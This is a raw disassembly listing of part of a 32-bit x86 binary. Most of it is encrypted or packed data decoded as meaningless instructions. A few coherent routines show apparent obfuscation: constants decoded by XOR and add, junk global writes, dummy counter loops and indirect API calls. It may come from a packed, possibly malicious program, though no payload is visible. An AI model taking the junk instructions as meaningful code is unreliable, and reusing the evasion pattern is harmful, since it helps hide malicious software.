  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	lds    ebx,FWORD PTR [esi+0x2cc68c68]
  405282:	jle    0x405302
  405284:	outs   dx,BYTE PTR ds:[esi]
  405285:	jg     0x405305
  405287:	jle    0x4052e5
  405289:	les    ecx,FWORD PTR [ebp-0x3efaa049]
  40528f:	mov    eax,ds:0xf5ada92d
  405294:	arpl   WORD PTR [ebx],si
  405296:	jge    0x40527e
  405298:	xor    bh,BYTE PTR [edi+0x6d]
  40529b:	push   ebp
  40529c:	lods   eax,DWORD PTR ds:[esi]
  40529d:	and    ah,BYTE PTR [edx+eiz*8+0x70da50aa]
  4052a4:	mov    cl,0x17
  4052a6:	fcom   DWORD PTR [ecx+ecx*4-0x7b]
  4052aa:	add    DWORD PTR [edx],edx
  4052ac:	push   ebx
  4052ad:	sub    BYTE PTR [edx+0x66],dl
  4052b0:	mov    dl,0x69
  4052b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b3:	ds jg  0x40524e
  4052b6:	jle    0x4052e4
  4052b8:	mov    esp,0xf7b36bf2
  4052bd:	jle    0x40525e
  4052bf:	inc    eax
  4052c0:	xchg   ebp,eax
  4052c1:	jnp    0x4052e9
  4052c3:	sahf   
  4052c4:	push   ds
  4052c5:	jbe    0x405284
  4052c7:	aas    
  4052c8:	mov    BYTE PTR [ecx+0x22],dh
  4052cb:	inc    edi
  4052cc:	inc    edi
  4052cd:	pop    eax
  4052ce:	shr    BYTE PTR [esi+0x4c25c38b],0x46
  4052d5:	mov    ah,0x14
  4052d7:	dec    esi
  4052d8:	dec    esi
  4052d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052da:	pop    es
  4052db:	in     al,0x40
  4052dd:	pop    eax
  4052de:	mov    bh,0xa1
  4052e0:	mov    esi,0x56eecc56
  4052e5:	jp     0x40532b
  4052e7:	dec    esp
  4052e8:	outs   dx,DWORD PTR ds:[esi]
  4052e9:	dec    ebx
  4052ea:	loopne 0x405334
  4052ec:	mov    bl,0x16
  4052ee:	jne    0x405295
  4052f0:	jbe    0x4052fa
  4052f2:	cs push 0x125acb
  4052f8:	bound  ecx,QWORD PTR [ebp+0x544f5342]
  4052fe:	popa   
  4052ff:	pop    eax
  405300:	test   BYTE PTR [edi+0x560b864f],cl
  405306:	repz and edx,esi
  405309:	xchg   edi,eax
  40530a:	iret   
  40530b:	xor    bh,BYTE PTR [esi-0x32]
  40530e:	cli    
  40530f:	in     al,0x7a
  405311:	hlt    
  405312:	scas   al,BYTE PTR es:[edi]
  405313:	push   0x9096cb1e
  405318:	sahf   
  405319:	fwait
  40531a:	cdq    
  40531b:	or     bl,BYTE PTR [ecx]
  40531d:	lock jg 0x405317
  405320:	std    
  405321:	mov    esp,0xb519ba24
  405326:	test   al,0x9c
  405328:	fs add eax,0x89d63a35
  40532e:	lock or al,0x67
  405331:	fiadd  DWORD PTR [ebp+0x5f38477f]
  405337:	jle    0x405321
  405339:	xchg   esp,eax
  40533a:	jae    0x4052c7
  40533c:	xor    al,0x6e
  40533e:	jp     0x405389
  405340:	int3   
  405341:	cmp    eax,ebx
  405343:	(bad)  
  405344:	sub    BYTE PTR [ebp+0x8],0x8a
  405348:	scas   al,BYTE PTR es:[edi]
  405349:	pop    esi
  40534a:	(bad)  
  40534b:	shl    DWORD PTR [edx+0x27],cl
  40534e:	mov    ecx,0x6915f52f
  405353:	and    eax,0xbb9644a3
  405358:	and    dh,bh
  40535a:	jp     0x4052f0
  40535c:	dec    edx
  40535d:	lahf   
  40535e:	ss (bad) 
  405360:	call   0x758f03d3
  405365:	dec    ecx
  405366:	neg    BYTE PTR [bx]
  405369:	mov    esi,0x5a57ff1d
  40536e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405370:	adc    DWORD PTR [edi],edi
  405372:	scas   eax,DWORD PTR es:[edi]
  405373:	pop    ecx
  405374:	outs   dx,DWORD PTR ds:[esi]
  405375:	test   eax,0xe1484142
  40537a:	and    BYTE PTR [ebx-0x2b38503f],al
  405380:	cmp    ebp,DWORD PTR [ebx+0x24]
  405383:	and    bh,BYTE PTR [ecx+eiz*2+0x77]
  405387:	ror    BYTE PTR [esi+0x70],cl
  40538a:	lods   eax,DWORD PTR ds:[esi]
  40538b:	xchg   esi,eax
  40538c:	imul   ebp,DWORD PTR [edx],0x77f0fee5
  405392:	scas   eax,DWORD PTR es:[edi]
  405393:	stos   DWORD PTR es:[edi],eax
  405394:	jmp    0x40531b
  405396:	jns    0x40535f
  405398:	mov    al,ah
  40539a:	clc    
  40539b:	jnp    0x4053f6
  40539d:	xchg   esp,eax
  40539e:	(bad)  
  40539f:	retf   
  4053a0:	inc    BYTE PTR [ebx+ebx*8]
  4053a3:	call   0xb0d2:0x5275a9f0
  4053aa:	or     al,0xd
  4053ac:	gs pop ebx
  4053ae:	rcl    edx,cl
  4053b0:	xchg   BYTE PTR [ecx],ch
  4053b2:	mov    bh,BYTE PTR [esi+0x4f88f00a]
  4053b8:	sbb    BYTE PTR [edi+esi*8-0x26358a68],bl
  4053bf:	or     al,0x7d
  4053c1:	mov    edi,0x18ceee54
  4053c6:	outs   dx,DWORD PTR ds:[esi]
  4053c7:	mov    esi,0x8447053c
  4053cc:	dec    edx
  4053cd:	push   esp
  4053ce:	mov    esp,0x68c57f51
  4053d3:	mov    ah,0x6
  4053d5:	les    esi,FWORD PTR [ebp+ebp*4+0x38]
  4053d9:	pop    edx
  4053da:	rcl    BYTE PTR [esi-0x6c],cl
  4053dd:	or     eax,edi
  4053df:	dec    esp
  4053e0:	push   ecx
  4053e1:	not    BYTE PTR [ebp+0x46]
  4053e4:	dec    DWORD PTR [esi]
  4053e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053e7:	cmc    
  4053e8:	inc    esp
  4053e9:	(bad)  
  4053eb:	or     esi,DWORD PTR [ecx+0x64f679b2]
  4053f1:	pop    esi
  4053f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053f3:	sbb    BYTE PTR [ebp+0x5],dl
  4053f6:	mov    esi,0x52dc0e27
  4053fb:	jle    0x405468
  4053fd:	je     0x40538b
  4053ff:	and    al,BYTE PTR [esi+0x5baa2fe5]
  405405:	rcl    BYTE PTR cs:[esi-0x7c3ed2d4],cl
  40540c:	out    0xfc,al
  40540e:	pop    ebx
  40540f:	ror    BYTE PTR [edi],1
  405411:	sub    BYTE PTR [ecx+0x1c3cbf6a],ah
  405417:	pop    ebx
  405418:	(bad)  
  405419:	jl     0x4053f1
  40541b:	in     eax,0x3c
  40541d:	test   al,0xf9
  40541f:	in     al,dx
  405420:	(bad)  [ebp+0x8]
  405423:	pop    ecx
  405424:	repz int3 
  405426:	lea    esi,[esi+0x20]
  405429:	in     al,dx
  40542a:	out    0xa2,eax
  40542c:	fcom   DWORD PTR [edi]
  40542e:	sbb    BYTE PTR [ecx+0x1d4320b8],cl
  405434:	bound  esi,QWORD PTR [ebx+0x2f]
  405437:	inc    edx
  405438:	clc    
  405439:	push   ebx
  40543a:	xchg   DWORD PTR [ebp+esi*1-0x5f],esp
  40543e:	mov    dh,0xca
  405440:	rcl    BYTE PTR [ecx+ebx*2],cl
  405443:	adc    eax,0x7eaa7880
  405448:	cmp    DWORD PTR [eax],esi
  40544a:	sub    DWORD PTR [ebp-0x4fb0ed99],ebx
  405450:	push   0xe3c79f75
  405455:	xlat   BYTE PTR ds:[ebx]
  405456:	sbb    BYTE PTR [edi+0x4c],bh
  405459:	dec    ecx
  40545a:	jns    0x4053f9
  40545c:	clc    
  40545d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40545e:	fwait
  40545f:	mov    edi,0x642c859c
  405464:	pop    edi
  405465:	cmc    
  405466:	or     DWORD PTR [ebx-0x13],0x6257a3b8
  40546d:	push   ss
  40546e:	or     DWORD PTR ds:0x7b6d1430,esi
  405474:	sbb    al,0x74
  405476:	push   0x6b
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x7ba2c60a
  4055e5:	mov    al,0xd5
  4055e7:	pop    ss
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405608
  4055f1:	cmp    dh,BYTE PTR [ecx-0x63b9e695]
  4055f7:	das    
  4055f8:	push   eax
  4055f9:	add    ebx,ebp
  4055fb:	inc    esi
  4055fc:	les    eax,FWORD PTR [esi+0x3de875ad]
  405602:	adc    DWORD PTR [eax+0x3c],eax
  405605:	jg     0x4055fa
  405607:	mov    esi,0xe3f4ac85
  40560c:	and    BYTE PTR [eax],dl
  40560e:	xchg   edx,eax
  40560f:	(bad)  
  405611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405612:	xchg   DWORD PTR [ecx+0x63],esi
  405615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405616:	dec    ebx
  405617:	xchg   esi,eax
  405618:	fdivr  QWORD PTR [esi+0x79]
  40561b:	(bad)  
  40561d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40561e:	out    dx,eax
  40561f:	out    dx,al
  405620:	pop    eax
  405621:	add    eax,0x86ecd9ad
  405626:	hlt    
  405627:	mov    edi,0xf0ba9440
  40562c:	scas   eax,DWORD PTR es:[edi]
  40562d:	pop    edi
  40562e:	cwde   
  40562f:	in     eax,0x3f
  405631:	mov    gs:0x18be3455,eax
  405637:	jns    0x40563c
  405639:	icebp  
  40563a:	inc    ebx
  40563b:	arpl   WORD PTR [edx-0x13],di
  40563e:	imul   esp,DWORD PTR [ecx+edx*1-0x9],0x23
  405643:	in     eax,dx
  405644:	call   FWORD PTR [ebx+0x58]
  405647:	push   es
  405648:	out    0x5b,al
  40564a:	rcr    BYTE PTR [ebp-0x2db7cf3a],0x71
  405651:	rol    DWORD PTR [edx],0xdc
  405654:	jecxz  0x40569c
  405656:	mov    al,BYTE PTR [edx-0xc]
  405659:	test   DWORD PTR [esi-0xd],0x5573f34c
  405660:	and    DWORD PTR [ebx-0x2b],ecx
  405663:	or     ebp,0xffffffab
  405666:	les    esi,FWORD PTR [esi]
  405668:	ds sbb al,0x3b
  40566b:	dec    esi
  40566c:	xchg   esp,eax
  40566d:	cmp    DWORD PTR [esi+0x28],ecx
  405670:	jmp    0x405699
  405672:	xor    eax,DWORD PTR [esi]
  405674:	jmp    0x5900ab24
  405679:	retf   
  40567a:	je     0x40564a
  40567c:	jnp    0x40563a
  40567e:	mov    ch,0x50
  405680:	cmp    BYTE PTR ds:0x45fe8e5,al
  405686:	arpl   WORD PTR [eax-0x4d4ac722],dx
  40568c:	ret    0x37f4
  40568f:	(bad)  
  405690:	pop    ds
  405691:	int3   
  405692:	ret    
  405693:	jmp    0x36a2:0x963bda5a
  40569a:	sbb    eax,0xfbcd7c91
  40569f:	shr    BYTE PTR [ecx-0x4],0xcc
  4056a3:	shl    BYTE PTR [edx-0x27f57bba],cl
  4056a9:	dec    eax
  4056aa:	push   es
  4056ab:	sahf   
  4056ac:	repz enter 0x2310,0xe0
  4056b1:	xchg   ecx,eax
  4056b2:	fimul  WORD PTR [edi]
  4056b4:	xchg   BYTE PTR [ebp+0x41d49ca2],dh
  4056ba:	xchg   edx,esi
  4056bc:	xchg   edx,eax
  4056bd:	push   ebx
  4056be:	mov    ebx,0xcdc84622
  4056c3:	adc    dl,BYTE PTR [eax-0x36]
  4056c6:	or     esi,ebx
  4056c8:	cmp    al,0x90
  4056ca:	mov    edx,0x97a1bbf8
  4056cf:	inc    eax
  4056d0:	lea    ebx,[edx+edi*8]
  4056d3:	mov    dl,ch
  4056d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d6:	retf   
  4056d7:	add    eax,0x32920c07
  4056dc:	into   
  4056dd:	(bad)  
  4056de:	neg    BYTE PTR [edx]
  4056e0:	mov    ah,0x56
  4056e2:	daa    
  4056e3:	mov    ah,0x88
  4056e5:	cmp    dl,BYTE PTR [edx]
  4056e7:	lds    edx,FWORD PTR [eax+0xa]
  4056ea:	mov    esp,0xa4e62f3e
  4056ef:	repnz stos DWORD PTR es:[edi],eax
  4056f1:	push   edx
  4056f2:	jmp    0xac01:0xb842aa9f
  4056f9:	mov    dh,0x83
  4056fb:	jmp    0xdaba:0xd054fe0
  405702:	stc    
  405703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405704:	and    al,BYTE PTR [edi-0x6b]
  405707:	xchg   esp,eax
  405708:	xor    eax,0xa5959342
  40570d:	in     al,dx
  40570e:	loop   0x4056b0
  405710:	dec    esi
  405711:	sbb    eax,0x7c013db7
  405716:	xlat   BYTE PTR ds:[ebx]
  405717:	push   0xc50bc5f7
  40571c:	mov    eax,0x9b518e67
  405721:	mov    dl,0xb
  405723:	aaa    
  405724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405725:	dec    ebx
  405726:	adc    edi,edx
  405728:	xchg   DWORD PTR [edx-0x77b6d19c],edx
  40572e:	fsubr  QWORD PTR [eax+0xaf33791]
  405734:	jge    0x4056b9
  405736:	ins    BYTE PTR es:[edi],dx
  405737:	mov    ecx,0xf20403df
  40573c:	std    
  40573d:	jp     0x4056f2
  40573f:	xor    ch,BYTE PTR [ebp+0x3b]
  405742:	push   es
  405743:	repnz imul ebp,DWORD PTR [ebp+0x15],0xffffffc9
  405748:	test   eax,0xe37267db
  40574d:	stc    
  40574e:	inc    edi
  40574f:	shl    ecx,1
  405751:	shl    ebp,cl
  405753:	cs jo  0x4056ee
  405756:	arpl   WORD PTR [ebp-0x7957415],bx
  40575c:	push   ss
  40575d:	bound  ebp,QWORD PTR [edx-0x47f118ba]
  405763:	or     eax,ecx
  405765:	retf   0xec5c
  405768:	xor    esp,esi
  40576a:	and    DWORD PTR [edx],esp
  40576c:	repz fs aas 
  40576f:	test   ch,dl
  405771:	fsubr  QWORD PTR [eax]
  405773:	fisttp WORD PTR [eax]
  405775:	(bad)  
  405776:	mov    ebx,0xead88c20
  40577b:	sahf   
  40577c:	jnp    0x4057f9
  40577e:	mov    esp,0x40486050
  405783:	mov    ah,0xc5
  405785:	jno    0x40577b
  405787:	mov    edx,0x2763b1a8
  40578c:	repnz inc ecx
  40578e:	iret   
  40578f:	pop    esi
  405790:	sub    DWORD PTR [ecx+0x7308c960],edx
  405796:	mov    cl,0xa9
  405798:	xchg   BYTE PTR [ecx-0x1094d673],ah
  40579e:	sbb    DWORD PTR [esi+edx*4-0x7d],ebp
  4057a2:	inc    ebp
  4057a3:	inc    ebp
  4057a4:	dec    eax
  4057a5:	push   ss
  4057a6:	leave  
  4057a7:	iret   
  4057a8:	dec    bh
  4057aa:	mov    DWORD PTR [esi],eax
  4057ac:	scas   al,BYTE PTR es:[edi]
  4057ad:	scas   al,BYTE PTR es:[edi]
  4057ae:	jbe    0x405777
  4057b0:	xchg   edx,ebx
  4057b2:	xor    cl,BYTE PTR [esi+0x4d1ab5f5]
  4057b8:	pop    eax
  4057b9:	adc    BYTE PTR [ecx-0x8],ah
  4057bc:	or     DWORD PTR [eax+0x41],esi
  4057bf:	dec    edx
  4057c0:	ret    0x61bb
  4057c3:	into   
  4057c4:	xchg   esi,eax
  4057c5:	xchg   esi,eax
  4057c6:	icebp  
  4057c7:	test   al,0x8f
  4057c9:	shl    bh,0xc7
  4057cc:	inc    ebp
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	fucomi st,st(5)
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42eddb3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	cwde   
  4059a3:	sub    edx,edx
  4059a5:	(bad)  
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x405978
  4059af:	stc    
  4059b0:	(bad)  
  4059b1:	fild   QWORD PTR [ebx-0x7f02da7e]
  4059b7:	mov    edi,0xccd41fea
  4059bc:	mov    edi,0x2ccf5961
  4059c1:	pop    es
  4059c2:	rol    DWORD PTR [ebp+0x2cad9ad1],cl
  4059c8:	pusha  
  4059c9:	cld    
  4059ca:	dec    esp
  4059cb:	lds    edx,FWORD PTR [esi+0x1b]
  4059ce:	xchg   edi,eax
  4059cf:	fnstsw WORD PTR [esi+0x5aa9847a]
  4059d5:	jbe    0x405975
  4059d7:	mov    ?,esp
  4059d9:	ja     0x405972
  4059db:	adc    dl,BYTE PTR [ebp+0x1ee0f15]
  4059e1:	in     al,dx
  4059e2:	(bad)  
  4059e3:	or     ebp,DWORD PTR [edx]
  4059e5:	add    al,BYTE PTR [esi-0x18]
  4059e8:	pop    ebp
  4059e9:	adc    al,0x94
  4059eb:	sub    DWORD PTR [esi+0x3a],esp
  4059ee:	push   ds
  4059ef:	pop    es
  4059f0:	pusha  
  4059f1:	stos   BYTE PTR es:[edi],al
  4059f2:	out    0x4e,eax
  4059f4:	ret    
  4059f5:	outs   dx,BYTE PTR ds:[esi]
  4059f6:	data16 sbb BYTE PTR [ebx-0x59],0x6f
  4059fb:	int    0x10
  4059fd:	dec    eax
  4059fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ff:	imul   edi,DWORD PTR [edi-0xb],0x99f6654d
  405a06:	(bad)  
  405a07:	das    
  405a08:	xor    eax,0xe64afdca
  405a0d:	leave  
  405a0e:	loope  0x4059b2
  405a10:	out    dx,al
  405a11:	pop    ss
  405a12:	out    0x4d,eax
  405a14:	std    
  405a15:	xchg   al,bl
  405a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a18:	(bad)  
  405a19:	or     al,0xb2
  405a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1c:	xchg   esi,eax
  405a1d:	cli    
  405a1e:	sbb    ebp,DWORD PTR [edx-0x5e]
  405a21:	sbb    esi,DWORD PTR [ebx]
  405a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a24:	cli    
  405a25:	test   BYTE PTR [edx],bl
  405a27:	into   
  405a28:	mov    al,ds:0xecbeb09d
  405a2d:	shl    DWORD PTR [ebp-0x2ba50b25],cl
  405a33:	pop    ds
  405a34:	sub    al,0x7f
  405a36:	sahf   
  405a37:	(bad)  
  405a38:	cdq    
  405a39:	add    al,0xdd
  405a3b:	push   ss
  405a3c:	xchg   edi,ecx
  405a3e:	pop    ecx
  405a3f:	jmp    0x4059f6
  405a41:	lods   al,BYTE PTR ds:[esi]
  405a42:	dec    ecx
  405a43:	sub    BYTE PTR [ebx+ebp*1+0x35],bl
  405a47:	arpl   WORD PTR [esp+eax*4-0x35321a94],bx
  405a4e:	in     al,0xcb
  405a50:	hlt    
  405a51:	in     al,0xfd
  405a53:	in     eax,dx
  405a54:	push   esp
  405a55:	mov    eax,DWORD PTR [ebp+0xa]
  405a58:	cmp    BYTE PTR [ebx],cl
  405a5a:	push   0xffffffa1
  405a5c:	dec    eax
  405a5d:	mov    bl,0x30
  405a5f:	inc    ebp
  405a60:	rcr    BYTE PTR [esi+0x3f463f65],0x70
  405a67:	mov    ebp,0xcc0834bb
  405a6c:	inc    edi
  405a6d:	sbb    cl,BYTE PTR [ecx+0x72fe9c8a]
  405a73:	xor    dl,BYTE PTR [edx+0x1766b223]
  405a79:	in     al,0xc
  405a7b:	fist   WORD PTR [ebp-0x70]
  405a7e:	pusha  
  405a7f:	fsubr  QWORD PTR [esp+edi*4]
  405a82:	jnp    0x405a84
  405a84:	mov    ds:0x919f7111,eax
  405a89:	xchg   ebx,ebx
  405a8b:	mov    ds:0xb369a1a0,eax
  405a90:	jmp    0x405b0c
  405a92:	xchg   esi,eax
  405a93:	sbb    ecx,DWORD PTR ds:0x93bb5bb5
  405a99:	adc    BYTE PTR [eax+ecx*8+0x6a],cl
  405a9d:	pop    ebx
  405a9e:	js     0x405abc
  405aa0:	nop
  405aa1:	repz popa 
  405aa3:	dec    esi
  405aa4:	jp     0x405ae5
  405aa6:	scas   eax,DWORD PTR es:[edi]
  405aa7:	xchg   ebx,eax
  405aa8:	jmp    0x405afd
  405aaa:	push   ebx
  405aab:	jo     0x405a3b
  405aad:	add    al,0x92
  405aaf:	imul   BYTE PTR [eax+0x68]
  405ab2:	int3   
  405ab3:	sub    dh,bh
  405ab5:	dec    eax
  405ab6:	dec    eax
  405ab7:	cmp    al,0xea
  405ab9:	pop    ecx
  405aba:	icebp  
  405abb:	call   0xbb87c16e
  405ac0:	ffree  st(4)
  405ac2:	inc    ebx
  405ac3:	cld    
  405ac4:	std    
  405ac5:	test   al,0x98
  405ac7:	test   eax,0xb405ab88
  405acc:	idiv   bl
  405ace:	(bad)  
  405acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad0:	inc    edi
  405ad1:	popa   
  405ad2:	loopne 0x405a81
  405ad4:	outs   dx,DWORD PTR ds:[esi]
  405ad5:	adc    edx,ecx
  405ad7:	xor    DWORD PTR [edx-0x19d43d62],edx
  405add:	mov    ah,0xdc
  405adf:	ret    
  405ae0:	mov    esp,0x8379edce
  405ae5:	push   cs
  405ae6:	int3   
  405ae7:	imul   edi,DWORD PTR [ecx+0x2424a453],0xfffffff4
  405aee:	jns    0x405ae8
  405af0:	pusha  
  405af1:	and    DWORD PTR [edx],edx
  405af3:	inc    edx
  405af4:	aas    
  405af5:	mov    es,WORD PTR [edx+0x365f23e1]
  405afb:	stc    
  405afc:	push   0x98f37b83
  405b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b02:	or     DWORD PTR [ecx-0x2468f938],ebx
  405b08:	mov    edx,0xde0fd083
  405b0d:	adc    al,0x56
  405b0f:	data16 cld 
  405b11:	push   ebp
  405b12:	pop    eax
  405b13:	cdq    
  405b14:	outs   dx,DWORD PTR ds:[esi]
  405b15:	unpckhps xmm0,XMMWORD PTR [eax]
  405b18:	fiadd  DWORD PTR [ebp+0x22dcaf62]
  405b1e:	aam    0x21
  405b20:	lahf   
  405b21:	cld    
  405b22:	outs   dx,BYTE PTR ds:[esi]
